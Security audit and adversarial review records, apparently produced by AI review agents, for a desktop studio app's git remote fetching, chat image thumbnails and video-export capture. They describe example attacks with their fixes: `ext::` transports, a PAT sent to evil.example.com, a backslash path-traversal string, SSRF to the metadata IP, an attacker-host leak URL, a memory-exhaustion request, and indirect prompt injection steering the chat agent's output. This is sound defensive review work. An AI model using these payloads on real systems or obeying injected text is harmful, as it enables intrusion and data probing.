- **Can the tokenless-fetch path be coerced to send the PAT to an attacker host, or spawn an unsafe transport?** **PAT: No.** Token attaches only when `isTrustedTokenHost(url)` (host is `github.com` / `*.github.com`, `service.ts:550-557`) and rides as `http.extraheader` to that host; modern curl strips a cross-host `Authorization` on redirect, and github.com won't cross-host-redirect a malicious repo — I could not construct a `new URL()`-says-github / git-connects-elsewhere parser differential. **Unsafe transport: No** — `ext::`/`fd::`/`transport::`/`file://` are refused by `classifyRemoteUrl` and double-blocked by `HARDENED_REMOTE_FLAGS`. The only thing that *does* get coerced is an **unauthenticated** fetch to an attacker host (F1/F2) — no secret rides it.
- **Does `noSystemGit()` reading `process.env` live introduce TOCTOU?** No security TOCTOU. `process.env` is only mutated by the server process / test harness — **no request route writes it**, so it is not attacker-reachable. There is a benign determinism wrinkle (a single logical op awaits `systemGitAvailable()` more than once, e.g. `gitFetchRemote:1094` and `:1097`; if env toggled between them you'd get inconsistent engine selection) but it requires in-process env mutation that only tests perform, and it degrades to a failed-auth error, not a privilege change.
- **Is there a path where opening a poisoned `.git/config` executes code within the poll window?** No RCE — the executing transports are refused pre-spawn (above). The poison that *does* fire within the poll window is the **network callout** (F1/F2), not code execution.

### Secondary — e2e harness (`apps/desktop/e2e/`)
- Token handling is **clean.** The lifecycle fixture clones `https://github.com/iagh66/maude-git-smoke.git` (`make-lifecycle-fixture.ts:21`) over HTTPS and relies on the **developer's own git credential helper** out-of-band (`MAUDE_USE_SYSTEM_GIT=1`, `wdio.lifecycle.conf.ts:23`); no token is embedded in env, written into the clone's `.git/config` URL, or persisted to a `.netrc`/temp file. `GIT_TERMINAL_PROMPT=0` is set on every spawn. The harness is not in npm `files` (apps/desktop/e2e is test-only) — not shipped.
- **Minor note (informational):** the scenario performs real network mutations (push/fold/PR via `gh`, `git-lifecycle.e2e.ts:31-33`) against a real GitHub repo using the runner's ambient credentials. On a shared CI runner with a broadly-scoped credential helper, a malicious edit to the scenario could push beyond the throwaway repo. Acceptable for a dev-machine harness; worth a scoped deploy-key if this ever runs in shared CI.

### Recommended follow-ups
- **(blocker, F1)** Add the `transport === 'http' && !trustedHttp → {ahead:0,behind:0}` guard before the engine branch in `remoteAheadBehindUncached` (`service.ts:~1617`), mirroring `gitFetchRemote:1089`. One line; closes the regression and F3.
- **(hardening, F2)** Extend the same trust gate to the ssh/`git://` branch of the unattended probe — don't let the *automatic* poll touch any non-`github.com` host without a one-time per-remote user trust gesture. Explicit-gesture fetch can stay permissive.
- Add a regression test: a repo whose `remote.origin.url` is a non-GitHub HTTP host must produce **zero** `git fetch` spawns on `status?remote=1` (assert via a spawn spy), under `systemGitAvailable() === true`.
- Re-frame the SKILL.md note from "fixture must be offline (test determinism)" to also flag the product-security implication, so the next reader doesn't re-derive the auto-fetch-on-open behavior as merely flaky.

decision.rationale:
## Security defender audit — 4 source files scanned (DDR-133 system-git auto-detect)

### Evidence sources
- Diff base: `fbaf628` (merge-base main…HEAD); audit run against uncommitted working tree + untracked DDR-133 files.
- Changed source in scope: `apps/studio/git/service.ts`, `apps/studio/github/service.ts`, `apps/studio/test/git-branches.test.ts`, `apps/studio/test/github-api.test.ts`, plus untracked `apps/desktop/e2e/**` (test-infra), `package.json`.
- Excluded as non-source: `apps/studio/dist/**` (built bundles), `apps/studio/client/**` (UI JSX, no security surface in this change), `site/lib/roadmap.json`, `.ai/**` docs.
- Lockfile changes: none.
- Severity floor: `medium` (config `security` block empty → default). Scope: classic in scope (default).

### Blockers (severity >= medium)
None. The diff does NOT regress the DDR-131 RCE/SSRF posture. All four priority invariants verified by static read.

### Invariant verification (the brief's bar)

1. **Engine probe never runs before the classify gate on a remote-touching path — VERIFIED.**
   - `gitFetchRemote` (`apps/studio/git/service.ts:1079-1097`): order is `readRemoteUrl` → `classifyRemoteUrl` → refuse `none`/`unsafe` (`:1081-1083`) → refuse http-non-github (`:1089-1090`) → ONLY THEN the first `await systemGitAvailable()` (`:1094`, `:1097`). `ext::`/`fd::`/`transport::` collapse to `unsafe` at `classifyRemoteUrl` (`:531`) and return before any spawn. The engine probe cannot be reached for a poisoned URL.
   - `remoteAheadBehindUncached` (`:1614-1619`): identical order — classify (`:1615`) → `unsafe`/`none` ⇒ return `{0,0}` with no spawn (`:1616`) → engine probe only for an already-vetted `http`/`ssh` transport. The 60s unattended probe — the known RCE sink — still refuses `ext::` before touching the binary. Regression-covered by `git-branches.test.ts:213` (asserts no `PWNED2` sentinel).

2. **Engine choice cannot relax the transport refusal — VERIFIED.** `systemGitAvailable()` (`:43-56`) returns a boolean that only selects WHICH engine runs an already-classified op; it is never consulted as part of the refusal decision. The hardened-flags backstop (`HARDENED_REMOTE_FLAGS`, `:564`, `protocol.ext/fd.allow=never`) is appended on every system-git spawn path (`:1102`, `:1669`), so even if classify were bypassed the git binary refuses the shell-spawning transports.

3. **PAT never lent to a non-github host — VERIFIED.** Token attaches only via `trustedHttp ? tokenHeaderArgs(token) : []` (`:1101`) and `trustedHttp ? token : undefined` (`:1619`), where `trustedHttp = http && isTrustedTokenHost(url)` (`:1084`, `:1617`) and `isTrustedTokenHost` (`:550-557`) pins hostname to `github.com`/`*.github.com`. SSH paths pass no token. The tokenless-fetch guard at `:1094` is correctly hoisted AFTER the http-non-github refusal at `:1089`, so the credential-helper fallback can only ever run against github.com. Regression-covered by `git-branches.test.ts:228` (token never sent to `evil.example.com`).

4. **`noSystemGit()` live `process.env` read (`:50`) — no widened surface.** Read-only env, gates engine choice only and only ever toward the *more*-restrictive iso engine (or, via `USE_SYSTEM_GIT`, system git — which still passes through every classify gate). Env is process-controlled, not attacker-reachable in this threat model. No finding.

5. **`listUserRepos` (`apps/studio/github/service.ts`) — no injection / unbounded loop / leak.** URL host hard-pinned to `https://api.github.com` (`:20`, `:87`); interpolated values are numeric constants (`PER_PAGE`, loop `page`) + a constant `affiliation` string — no user input in the path. Loop bounded by `PAGE_CAP=5` plus a short-page break. Token rides `Authorization: Bearer` to github only.

6. **e2e harness — test-infra, not shipped.** `apps/desktop/e2e/**` is absent from `package.json` `files` (confirmed). Fixtures shell out via `execFileSync` argv-form (`make-git-fixture.ts:20`, `make-lifecycle-fixture.ts:14`) — no shell-string interpolation. `MAUDE_USE_SYSTEM_GIT=1` is set only inside `wdio.*.conf.ts`. No hardcoded tokens/secrets in the harness.

### Warnings (below floor — visibility only)
- `apps/studio/github/service.ts:233-243` — robustness, not security: if `api()` returns a non-array error body, `repos.length < PER_PAGE` evaluates `undefined < 100` → false, so the loop makes all 5 pages of calls before stopping. Bounded by `PAGE_CAP=5` (no DoS), but consider an `Array.isArray(repos)` guard to fail fast.

### Dependency surface
- New deps: none. No lockfile change. No `postinstall` added to any package.

### Notes
- Strong positive: the change ships matching adversarial regression tests that run at the DEFAULT engine selection — `git-branches.test.ts:202` (`ext::` fetch refused, no `PWNED` sentinel), `:213` (`ext::` unattended probe refused), `:221` (`file://` refused), `:228` (PAT not sent to non-github). On any CI/dev box with `git` on PATH these execute the post-DDR-133 system-git-selected path, so the RCE/SSRF refusals are proven under the new engine, not just the old `USE_SYSTEM_GIT`-off path.
- `package.json` description/author changed UTF-8 `ě` → `ě` escape — cosmetic encoding only, no security impact.
- AI-era (§B) surface: none introduced by this change — nothing for `ethical-hacker` to pick up here.

Summary: 0 blockers, 1 warning, 3 notes. DDR-131 RCE/SSRF posture intact.

decision.rationale: ## Security attacker review — adversarial threat model (DDR-145 ACP chat image thumbnails) ### Change summary - Plan / decision: `.ai/archive/decisions/DDR-145-acp-chat-agent-referenced-image-render.md` - Diff base: uncommitted working tree on `main` - Files touched (source): `apps/studio/client/panels/acp-runtime.js` (new `designImageRefs`), `ChatPanel.jsx`, `app.jsx`, `styles/6-acp-chat.css`, `test/chat-attachments.test.ts` (+ derived `dist/*` bundles) - AI / MCP surface touched: yes — untrusted ASSISTANT transcript text now drives an auto-loading `` fetch - Prior defender report read: `ddr-145-image-thumbnails-defender.md` (1 medium blocker + 2 lows). The developer applied the defender's recommended fix in-tree; this review targets the residual. ### Threat model — trust boundaries - **Assistant transcript text → client render pipeline** — NEW. `designImageRefs(text)` runs on every `agent_message_chunk`-accumulated assistant bubble. Assistant text is partly untrusted (echoed tool output, file contents Claude reads, indirect prompt injection). It is now a *fetch-driving* input, not just displayed prose. - **Client-emitted URL → main-origin static fall-through** — the `` is resolved by the browser's WHATWG URL parser, THEN sent to the server, THEN clamped by `safePathUnderRoot` (repoRoot bound) + `nosniff`. Three normalizers, each with different rules — the gap lives between them. - **`/_config` → `designRel` prop** — server-authored config value flows into the client regex; app.jsx strips outer slashes only. ### Findings (attacker narrative) - **Backslash separator bypasses the new `..` traversal guard — designRel containment still broken** (medium) - I would do: get the string `` `.design/..\..\anything.png` `` into an assistant message — e.g. plant it in a file/tool output Claude echoes, or via indirect prompt injection ("...the screenshot is at `.design/..\..\.png`"). - By: the containment guard added as the "DDR-145 security follow-up" (`acp-runtime.js:474-476`) is a **blocklist**: it rejects `relPath` only when a `..` segment is delimited by forward-slash (`/(?:^|\/)\.\.(?:\/|$)/`) or when it contains `%`. It does **not** reject the backslash path separator. The captured token `.design/..\..\x.png` therefore passes the guard verbatim and is emitted as `src="/.design/..\..\x.png"`. The browser's URL parser (special scheme http/https) canonicalizes every `\` → `/` **before** issuing the request — reconstituting `/.design/../../x.png`, which collapses to `/x.png`. Verified empirically: `new URL('/.design/..\\..\\secret.png','http://localhost:4399').pathname` → `/secret.png`; `.design/..\logo.png` → `/logo.png`. The server then serves `/x.png` because `safePathUnderRoot` only prevents climbing *above* repoRoot, not escaping designRel *within* it. - Resulting in: the client auto-fetches and renders (thumbnail + lightbox, no user interaction) **any raster image anywhere under repoRoot**, not just under `/` — exactly the "silently widening the fetch surface from designRel to the whole repoRoot" the guard's own docstring claims to have closed. The remediation looks complete and is documented as complete; it is not. Bounded: same-origin only, response is not readable by the injected content and there is no off-origin channel (see AI section), so this is display/probe of in-repo rasters in the victim's own trusted native panel, not data theft — same impact ceiling the defender assigned the original `/`-traversal, restored despite the fix. - Cite: §A path-traversal / broken-containment (defender's A9); §B insecure-output-handling (untrusted model text → fetch primitive). - Mitigation: stop blocklisting substrings. After building `url`, resolve it (`new URL(url, location.origin)`) and reject unless `.pathname` still starts with `/${rel}/`; or reject any token containing `\` or `%` in addition to `..`. Allowlist the canonical result, don't pattern-ban the bad shapes. - **Forced-thumbnail UI trust-laundering** (low — adversarial-creativity) - I would do: via indirect injection, make Claude emit prose I control followed by a legit in-repo image path (e.g. the real brand mark `.design/system//preview/logo.png`, or — with the bypass above — any repo raster). - By: the strip renders purely on *text pattern match* of untrusted assistant output; the agent does not have to "intend" an image. A rendered, real-looking thumbnail under my attacker-authored text lends it visual authority inside the trusted desktop chrome. - Resulting in: a more convincing in-chat phishing/social-engineering surface (e.g. "click this thumbnail to verify" → lightbox → normal-looking flow). No code exec, no exfil; pure presentation trust-boost. - Cite: §B insecure-output-handling. - Mitigation: acceptable as-is given render-only same-origin scope; if tightened, gate the strip on paths the agent actually produced (tool-call output provenance) rather than free-text pattern match. ### Exploit chains - No viable chain to a higher severity. The backslash bypass has no off-origin exfil leg to compose with (markdown lane does not auto-load remote images — see AI section), and the injected content cannot read the fetch result back, so there is no oracle/exfil to promote the medium to high. The defender's two lows (percent-encoding, config `designRel`) share the backslash finding's root cause (blocklist containment) and are subsumed, not chained. **No viable chain across defender findings; the medium stands as the headline.** ### AI / MCP attack surface - Tool surface: no tool/MCP added or modified. No tool description text changed. - Model output → downstream: **yes, and this is the finding** — assistant (model) text drives an auto-loading same-origin `` GET. The containment (raster-only, same-origin, query stripped by the terminating lookahead, `..`/`%` guarded) is correct in intent but bypassable via `\` (finding 1). - Tool output → model input: tool output is echoed into assistant text; that text feeds `designImageRefs`. This is the indirect-injection lane — untrusted, correctly treated as such by design, but the guard is incomplete. - Trifecta check: **PASS (not completed by this change).** The ACP agent is the user's own loopback `claude` and is already a full-capability loop by design (DDR-123 — private data + reads untrusted content + can act/network; accepted, F2 auto-approve). This diff adds NO new *off-origin* outbound channel: the render URL is same-origin `/…`, the terminating lookahead strips any `?query`, rasters only, and the markdown renderer (`chat-markdown.jsx`) renders `![alt](url)` as a click-only `` (safeHref = http(s) only), never an auto-loading remote ``. So there is no automatic exfil sink in the feed for injected content to target. The backslash bypass reads local repo files into the *local* panel only. - Confused-deputy paths: none — no low-trust tool output flows into a high-privilege tool argument in this diff. - Excessive-agency tools: none added. - MCP supply chain: N/A — no MCP server added or upgraded (`Cargo.lock` one-line change is unrelated). - Output handling: React `` attribute, no `dangerouslySetInnerHTML`; `nosniff` + extension-derived MIME on the serve lane blocks content-type confusion / SVG-polyglot script exec. XSS-clean, confirmed. - Secret leakage via context: none — no credentials/system-prompt surface in this diff. - Jailbreak resilience for safety-critical decisions: N/A — no privileged action is gated on model compliance here; the render is inert. ### Adversarial-creativity finding (one per review) - The remediation for the defender's medium was applied *literally* — the defender wrote "split on `/`, drop any `..` segment"; the code drops `..` split on `/`. Both the fix and the recommendation it came from silently assume `/` is the only separator the browser will honor. It is not: for http(s), WKWebView's URL parser rewrites `\` → `/` after the client guard has run. The class of bug — "a downstream normalizer canonicalizes a separator the upstream sanitizer didn't know about" — is the exact shape that also produced the historic `..%2f` decode-mismatch bug documented in `isCanvasSafeRoute` (http.ts:1646). The guard here is `%`-aware (learning from that history) but not `\`-aware. Same lesson, new separator. ### Recommended follow-ups - **/flow:execute:** replace the substring blocklist in `designImageRefs` with a resolve-then-prefix-check (`new URL(url, location.origin).pathname.startsWith('/' + rel + '/')`), or additionally reject any candidate containing `\`. Add a regression test with `.design/..\..\x.png` and `.design/..\logo.png` (currently zero backslash coverage in `chat-attachments.test.ts`). - Consider validating `designRel` (from `/_config`) to a plain safe path segment (no `..`, no absolute, no `\`) at the app.jsx boundary — defense-in-depth for the peer/branch-shared `config.json` case the defender flagged low. - Update the DDR-145 docstring/decision text once fixed — it currently asserts containment that the shipped code does not fully provide.

decision.rationale: ## Security defender audit — 4 source files scanned (DDR-145 image thumbnails) ### Evidence sources - Diff base: uncommitted working tree (`git diff`) on `main` - Changed source files: `apps/studio/client/panels/acp-runtime.js`, `apps/studio/client/panels/ChatPanel.jsx`, `apps/studio/client/app.jsx`, `apps/studio/client/styles/6-acp-chat.css`, `apps/studio/test/chat-attachments.test.ts` - Regenerated bundle (`dist/client.bundle.js`, `dist/styles.css`) — derived, not audited - Lockfile changes: no (`Cargo.lock` one-line, unrelated) - Config: `security.severityFloor` unset → default **medium**; `security.scope` unset → classic in scope - Empirical: reproduced the regex behavior in Node (traversal + dedup/cap + `%2e%2e`) ### Blockers (severity >= medium) - `apps/studio/client/panels/acp-runtime.js:447` — **A9 path traversal / broken containment** (medium) - Snippet: `const at = raw.lastIndexOf(\`${rel}/\`); ... const url = \`/${raw.slice(at)}\`;` - Why: The function's advertised guarantee (DDR-145 + docstring: "nothing outside `/` ever matches", "containment to designRel prefix") is **false**. The captured path body `[^\s`'"()\[\]]+?` permits `.` and `/`, so `..` segments survive. Verified: `".design/../../etc/secret.png"` → emits `"/.design/../../etc/secret.png"`, which the browser normalizes to `/etc/secret.png` before the `` request; `".design/../.git/config.png"` → `/.git/config.png`. An indirect-injection string in ASSISTANT text / embedded tool output thus drives the panel to fetch **any raster under repoRoot**, not just under designRel — the client containment control is illusory. - Residual risk is bounded, NOT eliminated: the served lane's `safePathUnderRoot` (repoRoot bound) + `X-Content-Type-Options: nosniff` is the *only* real backstop and it holds (traversal beyond repoRoot → 403, verified live). There is no exfiltration channel — the image renders same-origin in the user's own panel only; the attacker receives no response. Impact is therefore "display/probe arbitrary repoRoot raster in the victim's panel," not data theft. Rated medium because a documented defense-in-depth control is defeated and the fetch surface silently widens from designRel to the whole repoRoot. - Fix: after computing `url`, reject any candidate whose path (post-normalization) is not still under `rel/` — e.g. split on `/`, drop the result if any segment is `..` (or `%2e%2e`/`%2E`), before pushing. Make the client guarantee match the docstring rather than delegating 100% to the server. ### Warnings (below floor) - `apps/studio/client/panels/acp-runtime.js:452` — A9 (low) — percent-encoded traversal (`.design/%2e%2e/x.png`, `.design/..%2f..%2fsecret.png`) passes the client filter verbatim; containment rests entirely on the server decoding-then-`safePathUnderRoot`. Server verified to 403 beyond root, so no escape past repoRoot, but the client filter provides zero traversal defense here — same root cause as the blocker. - `apps/studio/client/app.jsx:8213` — A10/config (low) — `designRel` is taken from `cfg.designRel || cfg.designRoot`. A hostile/peer-authored `config.json` value (e.g. `..`, `.`) would broaden the client matcher; the server `safePathUnderRoot` (repoRoot) still bounds the actual fetch, so no escape past repoRoot. `config.json` is a versioned/trusted artifact, so this is informational. ### Dependency surface - New deps: none. No lockfile change relevant to this feature. - Flagged: none. ### Notes - **XSS: clean.** `src` is always `"/" + path`; rendered via React `` / lightbox `` with no `dangerouslySetInnerHTML`. React escapes the attribute; `img src` cannot execute script, and `nosniff` blocks content-type confusion. `alt=""`. No injection vector in the rendered thumbnails or lightbox. - **DoS: adequate.** `cap = 6` bounds distinct URLs; the `urls.length < cap` loop guard exits early. The dedup path (a wall of identical refs) keeps scanning the whole message, but the regex is linear (no nested/overlapping quantifiers → no ReDoS) and assistant messages are size-bounded. Not a practical DoS. - **Prefix confusion / lookalike dirs: correctly handled.** `not-.design/x.png` rejected (segment-boundary anchor); `evil/.design/x.png` re-anchors to `/.design/x.png` (prefix stripped). SVG correctly excluded (scriptable). Raster-only allowlist enforced. - §B (AI-era / indirect-injection threat model of the transcript itself) is `ethical-hacker`'s lane — noted only that the transcript text is the untrusted source feeding this function. Summary: 1 blocker (medium), 2 warnings, 4 notes.

decision.title: DDR-148 video-animation layer — attacker (adversarial) security review
decision.rationale:
# DDR-148 video-animation layer — attacker (adversarial) security review

**Date:** 2026-07-04 · **Reviewer:** `ethical-hacker` (flow) · via `/flow:done`
**Diff range:** `d18ac98^..HEAD` (`d18ac98` → `1558539`) · 41 files under `apps/studio/`
**AI/MCP surface:** none touched. **Defender report:** present (PASS, 0 blockers) — this review **overturns defender finding #1**.

## Verdict (as filed): FAIL — 2 blockers @ medium floor, 2 below-floor warnings, 1 exploit chain

> **Resolution:** both blockers FIXED before close-out (see "Fixes applied" below). Re-verified.

## Findings

### F1 — SSRF + private-data exfil via export capture of an attacker-authored video-comp — HIGH (blocker) — **FIXED**
- **Chain:** DDR-148 adds `media-src 'self' blob:` (defender rated the canvas confinement SAFE, "No SSRF") + a new `<Video src>` fetch sink + a capture shim that ACTIVELY primes/seeks every `<video>`. The export renders the identical comp on the **MAIN origin**, where `serveCanvasShell`'s CSP was `applyCsp = process.env.MAUDE_CSP_POC === '1'` — **OFF by default**. So `media-src`/`connect-src 'self'` never applied to the capture. A malicious canvas with `<Video src="http://169.254.169.254/…">` (IMDS) or comp JS `fetch(internal).then(t => render t on-frame)` → the export Chromium fetches attacker URLs → blind SSRF → read-SSRF/exfil once the MP4/GIF artifact is shared back (the natural hub/multiplayer flow). The defender's "media-src governs the browser… No SSRF" is true for *preview*, false for *export*.
- **The checklist miss:** everyone verified the CSP on the *canvas* origin and stopped; nobody asked "does the same comp render where the CSP is absent?" It does — the export shell (main origin, CSP env-gated off).
- **Fix (applied):** `cspForCapture()` — a network-locked CSP (`default-src 'self'`, `media-src 'self' blob:`, `connect-src 'self'`, `img-src 'self' data: blob:`, no frames/objects/form) with `script-src` left permissive (the comp is arbitrary JS by design + the encoder is injected via `addScriptTag`; the threat is egress, not script). Applied to EVERY capture render (`?hide-chrome=1`) in `serveCanvasShell`, incl. the main origin. MP4 export re-verified working under it; regression test in `canvas-origin-gate.test.ts` asserts the main-origin capture shell carries `media-src 'self'` + `connect-src 'self'`.

### F2 — memory-amplification DoS: global body ceiling 16 MB → 108 MB reverts DDR-088 on canvas-reachable routes — MEDIUM (blocker) — **FIXED**
- DDR-148 raised `MAX_REQUEST_BODY` to `ASSET_MAX_VIDEO_BYTES + 8 MB` (~108 MB) for EVERY route on both listeners (so streaming `/_api/asset` can accept video). But `readJson` did `await req.text()` (buffers the whole body) BEFORE its 256 KB/1 MB logical cap. Untrusted canvas JS could `fetch('/_api/annotations', {method:'PUT', body:<107 MB>})` (that route is in `CANVAS_SAFE_API`) in a loop → repeated ~107 MB (UTF-16 ~2×) transient allocations → OOM DoS (peer-reachable on the hub image). DDR-088 set 16 MB precisely to bound this.
- **Fix (applied):** `readJson` now content-length fast-rejects, then reads `req.body` via a streaming reader and ABORTS (`reader.cancel()`) the moment bytes exceed `max` — buffering at most ~max + one chunk. The 108 MB `maxRequestBodySize` stays (needed for the streaming asset route, which never uses `readJson`).

### F3 — untrusted-origin disk-fill DoS widened 4× (session 256 MB→1 GB, per-file 10 MB→100 MB) — LOW (below floor)
- `/_api/asset` is canvas-origin-reachable via plain `fetch`; up to ~1 GB/session can land in `designRoot/assets/` (rides git + sync). Bounded + localhost → LOW. **Follow-up:** lower the default budget or gate video upload behind an explicit gesture. (Not fixed in this pass — tracked.)

### F4 — retime const-rewrite retargets the FIRST same-named numeric const in the file — LOW (below floor)
- `retimeAttr` resolves a bare-identifier attr to the first `const NAME = <int>` in the whole file; a sequence `durationInFrames={W}` where `const W = 640` (a width) appears earlier → dragging the duration silently rewrites the width. Fully contained (clamped, reparse-gated, atomic, no boundary crossing) — a surprising in-file edit, not a vuln. **Follow-up:** scope the const search to the lexically-referenced binding. (Tracked.)

## AI/MCP
N/A — no model prompt, tool/function def, MCP server, or model-output-to-system pipeline touched. (Speculative adjacent note: an exfil-bearing MP4 from F1 could poison a downstream agent that later OCRs the artifact — out of this change's loop.)

## Fixes applied before close-out
- F1 → `cspForCapture()` + capture-CSP on `?hide-chrome=1` renders (http.ts) + regression test. Export re-verified.
- F2 → streaming size-capped `readJson` (http.ts).
- F3, F4 → tracked as below-floor follow-ups (see STATE.md / DDR-148 addendum).

```json
{"verdict_as_filed":"FAIL","blockers":2,"blockers_fixed":2,"warnings":2,"exploit_chains":1,"ai_surface_touched":false}
```

# DDR-148 video-animation layer — defender security audit

**Date:** 2026-07-04 · **Reviewer:** `security-auditor` (flow) · via `/flow:done`
**Diff range:** `d18ac98^..HEAD` (`d18ac98` → `1558539`) · 44 changed files, 16 source files scanned
**Config:** no `security` block ⇒ defaults `severityFloor = medium`, scope `[classic, ai, supply-chain]`

## Verdict: PASS-WITH-SUGGESTIONS — 0 blockers, 1 below-floor note

The net-new trust-boundary surface (canvas CSP media grant, two main-origin-only routes,
canvas-origin media serving, active-artboard postMessage, const-preferring retime rewrite) is
correctly gated and hardened; the only observation is a below-floor robustness nit (now fixed).

## Per-focus-area findings

1. **Canvas-origin CSP `media-src 'self' blob:` — SAFE.** Strictly tighter than the pre-existing
   `img-src 'self' data: blob:` (no `data:`). Media elements only GET, pinned to `'self'`, so
   `<video src="https://attacker/?leak=…">` is refused; `blob:` is same-origin/ephemeral/inert
   (Remotion processed media). No SSRF (media-src governs the browser, not the server).
2. **`/_api/retime-sequence` + `/_api/canvas-source` — SAFE, correctly MAIN-ORIGIN ONLY.** Absent
   from `startCanvasServer` routes AND `CANVAS_SAFE_API` → 404 from the canvas iframe. retime:
   POST-only, `sameOriginWrite` CSRF, 8 KB cap, `resolveCanvasAbs` containment, index `[0,500]`,
   frames clamped, pre-write snapshot. canvas-source: GET-only, read-only, containment, 512 KB cap.
3. **Canvas-origin media serving — SAFE.** Explicit MIME + `X-Content-Type-Options: nosniff`;
   `isCanvasSafeRoute` requires designRoot prefix, rejects `_`-segments + non-allowlisted exts.
   Content-type confusion closed by nosniff + the sha256-hash `script-src` (no `unsafe-inline`).
   Write side: `saveAssetFromStream` magic-byte-sniffs (SVG/HTML/script → 415), content-addressed.
4. **`active-artboard` postMessage — SAFE, gate correct.** Handler enforces BOTH
   `e.origin === canvasOrigin` AND `e.source === activeWin` (phase-28 F-2 pattern); a
   background/synced canvas is dropped. `id` is an inert display token, never a write sink (retime
   keys on numeric `index`).
5. **`retimeSequence` const-preferring AST rewrite — SAFE, reparse gate present.** Substituted
   values are bounded-integer strings; only a strict numeric literal is overwritten; non-numeric
   expressions refused. Interpolated identifier pre-validated `^[A-Za-z_$][\w$]*$`. `parseSync`
   reparse gate throws on errors → malformed rewrite never reaches disk (atomic temp+rename).

**Bonus — export capture spine:** `Bun.spawn(['node', ...args])` argv array, no shell → no command
injection; numeric options clamped; `--url` is the loopback shell URL; `/_api/export` main-origin.

**Dependencies (A10):** `remotion`/`@remotion/player`/`@remotion/transitions` pinned EXACT `4.0.484`;
`gifenc`/`mediabunny` caret (repo convention). Legitimate, non-typosquat; `pnpm-lock.yaml` committed
in-range. In-page encoder runs inside the sandboxed capture browser.

## Warnings (below floor)

- `client/app.jsx` active-artboard `id` stored uncapped vs the sibling `timeline-comps` handler
  (caps 120). Inert (gated, display-only). **FIXED** — added `.slice(0, 120)`.

## Notes

- Uncommitted `apps/desktop/src-tauri/Cargo.lock` is out of DDR-148 scope (concurrent session bump).
- AI-era / auto-approving-ACP surfaces are the `ethical-hacker` lane.
